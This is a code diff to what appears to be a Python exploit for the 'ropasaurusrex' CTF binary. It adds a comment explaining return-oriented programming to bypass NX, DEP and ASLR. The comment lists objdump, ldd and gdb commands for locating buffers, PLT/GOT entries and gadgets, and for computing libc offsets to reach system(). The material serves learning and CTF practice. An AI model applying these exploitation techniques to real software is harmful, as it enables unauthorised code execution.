@@ -3,6 +3,30 @@ from struct import pack, unpack
 import sys
 import os
 
+'''
+    An example from https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming
+    the example program is written in Ruby, I just rewrite it in Python.
+    Very typical example for ROP.
+
+    The exploit is for NX, DEP and ASLR.
+
+    Tricks to use:
+        objdump -x rop | grep "\.bss|\.dynamic|\.data"       find the buffer
+        objdump -D rop | grep "read|write" -A1               find the I/O function's PLT and GOT
+        ldd rop                                              get the libc
+        gdb rop core                                         debug the program after core dumped.(first use unlimit -c unlimited to unlock the function)
+        ROPGadget / objdump -D rop | egrep "pop|ret"         find the ROPGadget to use (pop pop pop ret!)
+
+    Bypass ASLR:
+        use the diff between read_addr and system_addr in libc or in runtime
+        1) in libc
+            objdump libc | grep "read|system"
+        2) in runtime
+            use gdb command:
+                x system
+                x read
+'''
+
 target = './ropasaurusrex'
 write_plt = 0x804830c
 read_plt = 0x804832c
